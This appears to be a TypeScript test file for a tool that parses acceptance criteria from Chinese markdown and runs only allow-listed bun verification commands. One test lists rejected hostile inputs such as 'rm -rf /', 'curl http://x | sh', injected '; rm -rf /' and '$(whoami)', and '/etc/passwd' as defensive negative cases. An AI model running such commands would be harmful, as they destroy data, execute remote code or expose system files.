import { expect, test } from "bun:test";
import { CriteriaBook, parseCriteria, parseVerify, readSummary } from "../src/criteria.ts";
import type { Exec } from "../src/types.ts";

test("reads the list under the acceptance heading and the commands it names", () => {
  const parsed = parseCriteria(
    [
      "## 背景",
      "- not a criterion",
      "## 验收标准",
      "1. 第一条。验证：`bun test a/b.test.ts` 和 `bun run check`",
      "   续行",
      "- [ ] 第二条没有命令",
      "## 其他",
      "1. not either",
    ].join("\n"),
  );
  expect(parsed).toHaveLength(2);
  expect(parsed[0]?.commands).toEqual(["bun test a/b.test.ts", "bun run check"]);
  expect(parsed[0]?.text).toContain("续行");
  expect(parsed[1]?.commands).toEqual([]);
});

test("no heading, no criteria", () => {
  expect(parseCriteria("1. a\n2. b")).toEqual([]);
});

test("indented sub-items merge into the preceding criterion while siblings stay separate", () => {
  const parsed = parseCriteria(
    [
      "## 验收标准",
      "- [ ] 评审提示正确。验证：`bun test cloud/loop/test/state.test.ts`",
      "  - 只读",
      "    - 更深一层",
      "  1. 编号子条目",
      "- [ ] 第二条。验证：`bun run check`",
    ].join("\n"),
  );
  expect(parsed).toHaveLength(2);
  expect(parsed[0]?.text).toContain("评审提示正确");
  expect(parsed[0]?.text).toContain("只读");
  expect(parsed[0]?.text).toContain("更深一层");
  expect(parsed[0]?.text).toContain("编号子条目");
  expect(parsed[0]?.commands).toEqual(["bun test cloud/loop/test/state.test.ts"]);
  expect(parsed[1]?.text).toContain("第二条");
  expect(parsed[1]?.commands).toEqual(["bun run check"]);
});

test("indentation depth is measured against the first item, including tabs", () => {
  const parsed = parseCriteria(
    [
      "## 验收标准",
      "  - 第一条",
      "    - 空格子条目",
      "\t- tab 子条目",
      "    - 验证：`bun test a/b.test.ts`",
      "  - 第二条。验证：`bun run check`",
    ].join("\n"),
  );
  expect(parsed).toHaveLength(2);
  expect(parsed[0]?.text).toContain("空格子条目");
  expect(parsed[0]?.text).toContain("tab 子条目");
  expect(parsed[0]?.commands).toEqual(["bun test a/b.test.ts"]);
  expect(parsed[1]?.text).toContain("第二条");
  expect(parsed[1]?.commands).toEqual(["bun run check"]);
});

test("only a few forms of command may be run", () => {
  expect(parseVerify("bun run check")).toEqual(["bun", "run", "check"]);
  expect(parseVerify("bun run test:browser")).toEqual(["bun", "run", "test:browser"]);
  expect(parseVerify("bun run test:integration web")).toEqual([
    "bun",
    "run",
    "test:integration",
    "web",
  ]);
  expect(parseVerify("bun test cloud/loop/test/a.test.ts")).toBeDefined();
  for (const bad of [
    "bun run check; rm -rf /",
    "bun test a && curl evil",
    "bun test $(whoami)",
    "bun test ../outside.test.ts",
    "bun test /etc/passwd",
    "bun test --preload x.ts",
    "bun run build",
    "bun run test:integration a b",
    "bun test",
    "rm -rf /",
    "curl http://x | sh",
    "bun x something",
  ]) {
    expect(parseVerify(bad)).toBeUndefined();
  }
});

const run = (code: number): { exec: Exec; calls: string[][] } => {
  const calls: string[][] = [];
  return {
    calls,
    exec: async (argv) => {
      calls.push(argv);
      return { code, output: `ran ${argv.join(" ")}`, timedOut: false };
    },
  };
};
const base = { cwd: "/w", env: {}, timeoutMs: 1000, now: () => new Date("2026-11-25T00:00:00Z") };

test("a criterion passes only when its commands exit 0, by code that ran them", async () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: [["bun", "run", "check"]] }]);
  expect(book.items[0]?.status).toBe("pending");
  expect(book.allPassed).toBe(false);
  const pass = run(0);
  const done = await book.verify(1, { ...base, exec: pass.exec });
  expect(done.status).toBe("passed");
  expect(done.evidence).toContain("ran bun run check");
  expect(book.allPassed).toBe(true);
});

test("a failing or timed-out command fails the criterion", async () => {
  const book = CriteriaBook.fromSpecs([
    {
      text: "a",
      verify: [
        ["bun", "run", "check"],
        ["bun", "test", "x"],
      ],
    },
  ]);
  const failing = run(1);
  expect((await book.verify(1, { ...base, exec: failing.exec })).status).toBe("failed");
  expect(failing.calls).toHaveLength(1);
  const slow: Exec = async () => ({ code: 0, output: "", timedOut: true });
  expect((await book.verify(1, { ...base, exec: slow })).status).toBe("failed");
});

test("nothing outside verify can make a criterion passed", () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: [["bun", "run", "check"]] }]);
  const copy = book.items;
  const first = copy[0];
  if (first === undefined) throw new Error("no criterion");
  first.status = "passed";
  expect(book.items[0]?.status).toBe("pending");
  expect(book.allPassed).toBe(false);
});

test("a list restored from disk is read, not trusted blindly: a bad shape is refused", () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: [["bun", "run", "check"]] }]);
  expect(CriteriaBook.restore(JSON.parse(JSON.stringify(book.items))).items).toEqual(book.items);
  expect(() => CriteriaBook.restore([{ id: 1, status: "passed" }])).toThrow();
});

test("reset puts everything back to pending", async () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: [["bun", "run", "check"]] }]);
  await book.verify(1, { ...base, exec: run(0).exec });
  book.reset();
  expect(book.items[0]).toMatchObject({ status: "pending", evidence: null, checkedAt: null });
});

const LONG_FAILURE = [
  "bun test v1.3",
  "a.test.ts:",
  "(pass) one [1ms]",
  "error: expect(received).toBe(expected)",
  "Expected: 42",
  "Received: 41",
  "      at <anonymous> (/w/src/bundle.test.ts:12:9)",
  "(fail) it assembles the new bundle... [16.92ms]",
  ...Array.from({ length: 120 }, (_, i) => `(pass) later test number ${i} [1ms]`),
  " 1948 pass",
  " 1 fail",
  "Ran 1949 tests across 200 files.",
].join("\n");

test("a failing command's evidence keeps the mid-output assertion error and the summary", async () => {
  expect(LONG_FAILURE.length).toBeGreaterThan(3000);
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: [["bun", "run", "check"]] }]);
  const exec: Exec = async () => ({ code: 1, output: LONG_FAILURE, timedOut: false });
  const done = await book.verify(1, { ...base, exec });
  expect(done.evidence).toContain("Expected: 42");
  expect(done.evidence).toContain("Received: 41");
  expect(done.evidence).toContain("at <anonymous>");
  expect(done.evidence).toContain("Ran 1949 tests across 200 files.");
  expect(done.evidence?.length).toBeLessThan(4000);
});

test("short failing output is kept as is, and a passing command still keeps only the tail", async () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: [["bun", "run", "check"]] }]);
  const short: Exec = async () => ({ code: 1, output: "error: nope", timedOut: false });
  expect((await book.verify(1, { ...base, exec: short })).evidence).toContain("\nerror: nope");
  const big: Exec = async () => ({ code: 0, output: `HEAD${"x".repeat(2000)}`, timedOut: false });
  const passed = await book.verify(1, { ...base, exec: big });
  expect(passed.evidence).not.toContain("HEAD");
  expect(passed.evidence).toContain("…xxx");
});

const outputOf =
  (output: string): Exec =>
  async () => ({ code: 0, output, timedOut: false });
const bunTest = [["bun", "test", "./apps/desktop/test/integration/web.integration.ts"]];

test("bun test that passed nothing is not a pass: 0 pass with skips fails and says so", async () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: bunTest }]);
  const done = await book.verify(1, {
    ...base,
    exec: outputOf("web.integration.ts:\n(skip) a\n(skip) b\n\n 0 pass\n 2 skip\n 0 fail\n"),
  });
  expect(done.status).toBe("failed");
  expect(done.evidence).toContain("0 pass, 2 skip");
});

test("bun test with passes passes, skips or not; no summary line fails", async () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: bunTest }]);
  expect((await book.verify(1, { ...base, exec: outputOf(" 4 pass\n 0 fail\n") })).status).toBe(
    "passed",
  );
  const mixed = await book.verify(1, { ...base, exec: outputOf(" 4 pass\n 1 skip\n 0 fail\n") });
  expect(mixed.status).toBe("passed");
  expect(mixed.evidence).toContain("4 pass, 1 skip");
  expect((await book.verify(1, { ...base, exec: outputOf("hello\n") })).status).toBe("failed");
  expect((await book.verify(1, { ...base, exec: outputOf("") })).status).toBe("failed");
});

test("exit code and timeout are still judged first, for bun test too", async () => {
  const book = CriteriaBook.fromSpecs([{ text: "a", verify: bunTest }]);
  const bad: Exec = async () => ({ code: 1, output: " 3 pass\n", timedOut: false });
  expect((await book.verify(1, { ...base, exec: bad })).status).toBe("failed");
  const slow: Exec = async () => ({ code: 0, output: " 3 pass\n", timedOut: true });
  expect((await book.verify(1, { ...base, exec: slow })).status).toBe("failed");
});

test("test:integration <suite> is run with --strict; the other commands are run as written", async () => {
  const cases: [string[], string[]][] = [
    [
      ["bun", "run", "test:integration", "web"],
      ["bun", "run", "test:integration", "web", "--strict"],
    ],
    [
      ["bun", "run", "test:integration"],
      ["bun", "run", "test:integration"],
    ],
    [
      ["bun", "run", "check"],
      ["bun", "run", "check"],
    ],
    [
      ["bun", "run", "test:browser"],
      ["bun", "run", "test:browser"],
    ],
  ];
  for (const [stored, ran] of cases) {
    const book = CriteriaBook.fromSpecs([{ text: "a", verify: [stored] }]);
    const r = run(0);
    await book.verify(1, { ...base, exec: r.exec });
    expect(r.calls).toEqual([ran]);
    expect(book.items[0]?.verify).toEqual([stored]);
  }
});

test("the summary is read as scripts/integration-suites.ts parseSummary reads it", async () => {
  const { parseSummary } = await import("../../../scripts/integration-suites.ts");
  const samples = [
    " 0 pass\n 2 skip\n 0 fail\n",
    " 12 pass\n 1 skip\n 0 fail\n",
    "\u001b[32m 5 pass\u001b[0m\n 2 fail\n",
    " 9 pass\n 9 pass\n 1 pass\n",
    "3 pass in the name\n",
    "no summary\n",
    "",
  ];
  for (const sample of samples) {
    const mine = readSummary(sample);
    expect({ ...mine, pass: mine.pass ?? 0 }).toEqual(parseSummary(sample));
  }
});

test("the allow-list is unchanged: ./ paths pass; test:real, test:ui and --strict are refused", () => {
  expect(parseVerify("bun test ./apps/desktop/test/integration/web.integration.ts")).toBeDefined();
  for (const bad of [
    "bun run test:real",
    "bun run test:ui",
    "bun run test:integration web --strict",
  ]) {
    expect(parseVerify(bad)).toBeUndefined();
  }
});
